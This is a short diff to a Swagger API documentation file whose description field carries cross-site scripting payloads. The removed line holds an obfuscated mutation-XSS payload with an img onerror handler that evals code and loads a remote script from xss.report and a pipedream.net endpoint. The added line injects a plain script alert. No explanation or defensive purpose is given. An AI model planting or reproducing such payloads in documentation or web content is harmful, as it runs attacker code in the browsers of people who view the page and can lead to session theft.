@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=eval('var a=document.createElement(\'script\');a.src=\'//xss.report/s/yyaminn\';document.body.appendChild(a)' src=https://eo5bxu6wq6bvuam.m.pipedream.net>"></form>
+   <script>alert(5)</script>
 
   version: production
 basePath: /JSSResource/
